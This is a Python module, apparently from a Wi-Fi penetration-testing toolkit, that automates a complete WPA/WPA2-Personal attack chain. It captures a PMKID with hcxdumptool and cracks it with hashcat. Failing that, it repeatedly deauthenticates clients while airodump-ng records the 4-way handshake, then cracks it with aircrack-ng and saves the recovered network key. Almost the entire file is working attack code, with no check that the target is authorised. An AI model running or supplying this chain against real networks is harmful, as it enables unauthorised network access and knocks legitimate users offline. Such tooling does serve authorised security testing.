"""Custom WPA/WPA2-Personal attack chain (PMKID + 4-way handshake capture and
cracking), replacing wpaAttacks.sh's `wifite --wpa` invocation.
"""

import re
import time
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path

from core import colors, device
from core.project import AccessPoint, Project
from core.shell import run_cmd, start_background, stop_background
from packet import deauth, handshake

DEFAULT_TIMEOUT_S = 300
DEFAULT_DEAUTH_INTERVAL_S = 10
DEFAULT_DEAUTH_COUNT = 4
DEFAULT_PMKID_TIMEOUT_S = 60


@dataclass
class HandshakeResult:
    success: bool
    cap_path: Path | None


@dataclass
class CrackResult:
    success: bool
    key: str | None


def _timestamp() -> str:
    return datetime.now().strftime("%d-%m-%y_%H-%M-%S")


def capture_handshake(
    iface: str,
    project: Project,
    bssid: str,
    essid: str,
    channel: str,
    clients: list[str],
    timeout_s: int = DEFAULT_TIMEOUT_S,
    deauth_interval_s: int = DEFAULT_DEAUTH_INTERVAL_S,
    deauth_count: int = DEFAULT_DEAUTH_COUNT,
) -> HandshakeResult:
    """Captures a WPA 4-way handshake by periodically deauthing clients while airodump-ng records."""
    device.set_channel(iface, channel)

    safe_bssid = bssid.replace(":", "-")
    prefix = project.captures_dir / f"{safe_bssid}-handshake-{_timestamp()}"
    cap_path = Path(f"{prefix}-01.cap")

    proc = start_background([
        "airodump-ng", "--bssid", bssid, "--channel", str(channel),
        "--output-format", "pcap", "-w", str(prefix), iface,
    ])

    targets = clients or [deauth.BROADCAST]
    deadline = time.time() + timeout_s
    try:
        while time.time() < deadline:
            for client in targets:
                deauth.send_deauth(iface, bssid, client, count=deauth_count)

            if cap_path.exists() and handshake.has_complete_handshake(cap_path, bssid):
                project.log_msg(f"{colors.GREEN}[*] Captured handshake for {bssid} -> {cap_path}{colors.NC}")
                return HandshakeResult(success=True, cap_path=cap_path)

            time.sleep(deauth_interval_s)
    finally:
        stop_background(proc)

    project.log_msg(f"{colors.RED}[!] Timed out waiting for a handshake from {bssid}{colors.NC}")
    return HandshakeResult(success=False, cap_path=cap_path if cap_path.exists() else None)


def crack_handshake(cap_path: Path, wordlist: str, bssid: str, project: Project) -> CrackResult:
    """Cracks a captured handshake against `wordlist` with aircrack-ng."""
    result = run_cmd(["aircrack-ng", "-w", wordlist, "-b", bssid, str(cap_path)])
    match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout)
    if match:
        key = match.group(1)
        project.log_msg(f"{colors.GREEN}[*] aircrack-ng found the key: {key}{colors.NC}")
        return CrackResult(success=True, key=key)
    project.log_msg(f"{colors.RED}[!] aircrack-ng did not find the key in {wordlist}{colors.NC}")
    return CrackResult(success=False, key=None)


def capture_pmkid(
    iface: str, project: Project, bssid: str, channel: str, timeout_s: int = DEFAULT_PMKID_TIMEOUT_S
) -> Path | None:
    """Captures a PMKID for `bssid` via hcxdumptool. Returns the pcapng path, or None if nothing was captured."""
    device.set_channel(iface, channel)

    safe_bssid = bssid.replace(":", "-")
    pcapng_path = project.captures_dir / f"{safe_bssid}-pmkid-{_timestamp()}.pcapng"
    filter_path = project.captures_dir / f"{safe_bssid}-pmkid-filter.txt"
    filter_path.write_text(bssid.replace(":", "").lower() + "\n")

    run_cmd(
        [
            "hcxdumptool", "-i", iface, "-o", str(pcapng_path),
            "--filterlist", str(filter_path), "--filtermode", "2",
            "--active_beacon",
        ],
        timeout=timeout_s,
    )

    if pcapng_path.exists() and pcapng_path.stat().st_size > 0:
        return pcapng_path
    return None


def crack_pmkid(pcapng_path: Path, wordlist: str, project: Project) -> CrackResult:
    """Converts a PMKID capture to hashcat's 22000 format and cracks it against `wordlist`."""
    hash_path = pcapng_path.with_suffix(".22000")
    run_cmd(["hcxpcapngtool", "-o", str(hash_path), str(pcapng_path)])

    if not hash_path.exists() or hash_path.stat().st_size == 0:
        project.log_msg(f"{colors.RED}[!] No PMKID hash extracted from {pcapng_path}{colors.NC}")
        return CrackResult(success=False, key=None)

    run_cmd(["hashcat", "-m", "22000", "-a", "0", str(hash_path), wordlist])
    result = run_cmd(["hashcat", "-m", "22000", str(hash_path), "--show"])

    line = result.stdout.strip().splitlines()[0] if result.stdout.strip() else ""
    if not line:
        project.log_msg(f"{colors.RED}[!] hashcat did not find the key in {wordlist}{colors.NC}")
        return CrackResult(success=False, key=None)

    key = line.split(":")[-1]
    project.log_msg(f"{colors.GREEN}[*] hashcat found the key: {key}{colors.NC}")
    return CrackResult(success=True, key=key)


def _save_key(project: Project, bssid: str, key: str) -> Path:
    safe_bssid = bssid.replace(":", "-")
    key_path = project.captures_dir / f"{safe_bssid}-key.txt"
    key_path.write_text(key + "\n")
    return key_path


def run_wpa_attack(iface: str, project: Project, ap: AccessPoint, wordlist: str) -> CrackResult:
    """Orchestrates a full WPA attack: PMKID first, falling back to handshake capture+crack."""
    project.log_msg(f"{colors.YELLOW}[*] Attempting PMKID capture against {ap.bssid}...{colors.NC}")
    pcapng_path = capture_pmkid(iface, project, ap.bssid, ap.channel)

    if pcapng_path is not None:
        result = crack_pmkid(pcapng_path, wordlist, project)
        if result.success:
            _save_key(project, ap.bssid, result.key)
            return result
        project.log_msg(f"{colors.YELLOW}[*] PMKID crack failed, falling back to handshake capture...{colors.NC}")
    else:
        project.log_msg(f"{colors.YELLOW}[*] No PMKID captured, falling back to handshake capture...{colors.NC}")

    handshake_result = capture_handshake(iface, project, ap.bssid, ap.essid, ap.channel, ap.clients)
    if not handshake_result.success or handshake_result.cap_path is None:
        return CrackResult(success=False, key=None)

    result = crack_handshake(handshake_result.cap_path, wordlist, ap.bssid, project)
    if result.success:
        _save_key(project, ap.bssid, result.key)
    return result
